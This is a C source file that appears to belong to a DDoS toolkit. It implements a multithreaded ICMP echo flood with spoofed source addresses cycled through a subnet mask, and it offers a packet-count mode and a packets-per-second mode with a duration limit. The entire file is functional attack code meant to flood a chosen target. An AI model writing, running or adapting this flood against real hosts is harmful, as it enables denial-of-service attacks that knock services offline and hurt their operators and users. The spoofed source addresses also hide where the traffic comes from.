#include "../header.h"
#include "../base/make_ipv4.h"
#include "../base/subnet_mask.h"
#include "../ddos/icmp_flood.h"

unsigned int icmp_total;
unsigned int icmp_produced;

unsigned int icmp_per_second;
unsigned int icmp_duration;
double icmp_elapsed_time;
char icmp_dest_ip[16];
char icmp_src_ip[16];
int icmp_dest_port;
short icmp_timed_finisher;

pthread_mutex_t icmp_mutex = PTHREAD_MUTEX_INITIALIZER;

pthread_cond_t icmp_cond;

int icmp_generated_count;

clock_t icmp_global_time;
clock_t icmp_global_elapsed_time;

void icmp_flood_print_usage(int mode) {
	if (mode == 1)
		printf(
				"ICMP flood Usage : [Src-IP] [Dest-IP] [# thread] [# requests(0 for INF)] [Dest-Port] [Mask(0-32)] \n");
	if (mode == 2)
		printf(
				"ICMP flood Usage : [Src-IP] [Dest-IP] [# thread] [# per seconds(0 for INF)] [icmp_duration (0 for INF)] [Dest-Port] [Mask(0-32)]\n");
}

void* generate_icmp_request1(void *data) {
	int mask = *((int*) data);
	int sock = make_socket(IPPROTO_ICMP);
	char icmp_now_ip[16];
	while (1) {

		struct icmp *p;
		char buffer[sizeof(struct icmp)];

		memset(buffer, 0x00, sizeof(struct icmp));

		struct iphdr ipv4_h;
		ipv4_h = prepare_empty_ipv4();
		ipv4_h = ipv4_set_protocol(ipv4_h, IPPROTO_ICMP);
		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(icmp_src_ip));

		//modify icmp_src_ip, increment 1.


		ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(icmp_dest_ip));

		p = (struct icmp*) buffer;
		p->icmp_type = ICMP_ECHO;
		p->icmp_code = 0;
		p->icmp_cksum = 0;
		p->icmp_seq = htons(icmp_produced);
		p->icmp_id = getpid();
		p->icmp_cksum = in_cksum((u_short*) p, sizeof(struct icmp));

		ipv4_h = ipv4_add_size(ipv4_h, sizeof(struct icmp));
		char *packet = packet_assemble(ipv4_h, p, sizeof(struct icmp));


		pthread_mutex_lock(&icmp_mutex);

		masking_next_ip_addr(icmp_src_ip, icmp_now_ip, mask);

		if (icmp_produced >= icmp_total) {
			pthread_mutex_unlock(&icmp_mutex);
			pthread_cond_broadcast(&icmp_cond);
			return 0;
		}

		send_packet(sock, ipv4_h, packet,icmp_dest_port);
		icmp_generated_count++;
		free(packet);
		icmp_produced++;

		pthread_mutex_unlock(&icmp_mutex);
	}
	close(sock);
	return 0;
}

void* generate_icmp_request2(void *data) {
	int mask = *((int*) data);
	int sock = make_socket(IPPROTO_ICMP);
	clock_t thread_clock;
	char icmp_now_ip[16];
	strcpy(icmp_now_ip,icmp_src_ip);
	while (1) {

		struct icmp *p;
		char buffer[sizeof(struct icmp)];

		memset(buffer, 0x00, sizeof(struct icmp));

		printf("Mask : %d , nowip : %s\n",mask,icmp_now_ip);
		struct iphdr ipv4_h;
		ipv4_h = prepare_empty_ipv4();
		ipv4_h = ipv4_set_protocol(ipv4_h, IPPROTO_ICMP);
		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(icmp_now_ip));

		//modify icmp_src_ip, increment 1.


		ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(icmp_dest_ip));

		p = (struct icmp*) buffer;
		p->icmp_type = ICMP_ECHO;
		p->icmp_code = 0;
		p->icmp_cksum = 0;
		p->icmp_seq = htons(icmp_total);
		p->icmp_id = getpid();
		p->icmp_cksum = in_cksum((u_short*) p, sizeof(struct icmp));

		char *packet = packet_assemble(ipv4_h, p, sizeof(struct icmp));
		ipv4_h = ipv4_add_size(ipv4_h, sizeof(struct icmp));

		pthread_mutex_lock(&icmp_mutex);

		masking_next_ip_addr(icmp_src_ip, icmp_now_ip, mask);

		thread_clock = clock();
		icmp_elapsed_time = ((double) (thread_clock - icmp_global_elapsed_time))
										/ CLOCKS_PER_SEC;

		if (icmp_elapsed_time >= icmp_duration) {
			pthread_mutex_unlock(&icmp_mutex);
			pthread_cond_broadcast(&icmp_cond);
			icmp_timed_finisher=1;
			return 0;
		}

		if (icmp_produced == icmp_per_second) {
			pthread_cond_wait(&icmp_cond, &icmp_mutex);
		}
		send_packet(sock, ipv4_h, packet, icmp_dest_port);
		icmp_generated_count++;
		free(packet);
		icmp_produced++;
		icmp_total++;

		pthread_mutex_unlock(&icmp_mutex);
	}
	close(sock);
	return 0;
}

void* icmp_time_check(void *data) {
	int thread_id = *((int*) data);
	clock_t t1;
	t1 = clock();
	icmp_global_elapsed_time = clock();
	double time_taken;

	while (1) {
		pthread_mutex_lock(&icmp_mutex);


		icmp_global_time = clock();
		icmp_elapsed_time = ((double) (icmp_global_time - icmp_elapsed_time)) / CLOCKS_PER_SEC;

		if(icmp_timed_finisher==1) return 0;
		time_taken = ((double) (icmp_global_time - t1)) / CLOCKS_PER_SEC;


		if (time_taken >= 1.0) {
			icmp_produced = 0;
			t1 = clock();
			time_taken = 0;

			pthread_cond_signal(&icmp_cond);
		}


		pthread_mutex_unlock(&icmp_mutex);
	}
}

void icmp_flood_run(char *argv[], int mode) {

	int mask = 0;
	int argc = 0;
	icmp_generated_count=0;
	icmp_timed_finisher=0;

	while (argv[argc] != NULL) {
		argc++;
	}

	if (mode == 1 && argc != 6) {
		icmp_flood_print_usage(mode);
		return;
	} else if (mode == 2 && argc != 7) {
		icmp_flood_print_usage(mode);
		return;
	}

	strcpy(icmp_src_ip, argv[0]);

	icmp_produced = 0;
	if (mode == 1)
	{
		icmp_total = atoi(argv[3]);
		icmp_dest_port = atoi(argv[4]);
		if(icmp_total==0)
			icmp_total = __UINT_MAXIMUM__;
		mask = atoi(argv[5]);
	}


	if (mode == 2) {
		icmp_total = 0;
		icmp_per_second = atoi(argv[3]);
		icmp_duration = atoi(argv[4]);

		if(icmp_per_second == 0)
			icmp_per_second = __UINT_MAXIMUM__;

		if (icmp_duration == 0)
			icmp_duration = __UINT_MAXIMUM__;

		icmp_dest_port = atoi(argv[5]);
		mask = atoi(argv[6]);
	}

	printf("Maximum = %ld\n",__UINT_MAXIMUM__);

	int num_threads = atoi(argv[2]);

	strcpy(icmp_dest_ip,argv[1]);

	int *generate_thread_id;
	pthread_t *generate_thread;

	generate_thread_id = (int*) malloc(sizeof(int) * (num_threads + 1));
	generate_thread = (pthread_t*) malloc(
			sizeof(pthread_t) * (num_threads + 1));

	int i;

	printf("Sending ICMP requests to %s using %d threads\n", icmp_dest_ip,
			num_threads);
	for (i = 0; i < num_threads; i++)
		generate_thread_id[i] = i;

	for (i = 0; i < num_threads; i++) {
		if (mode == 1)
			pthread_create(&generate_thread[i], NULL, generate_icmp_request1,
					&mask);
		if (mode == 2)
			pthread_create(&generate_thread[i], NULL, generate_icmp_request2,
					&mask);
	}

	if (mode == 2) {
		pthread_create(&generate_thread[i], NULL, icmp_time_check,
				(void*) &generate_thread_id[i]);
		num_threads++;
	}

	for (i = 0; i < num_threads; i++) {
		void *status;
		printf("called\n");
		pthread_join(generate_thread[i], &status);
		printf("thread %d joined\n", i);
	}

	printf("ICMP flood Finished\nTotal %d packets sent.\n",icmp_generated_count);

	pthread_mutex_destroy(&icmp_mutex);
	pthread_exit(NULL);

	free(generate_thread_id);
	free(generate_thread);


	return;
}

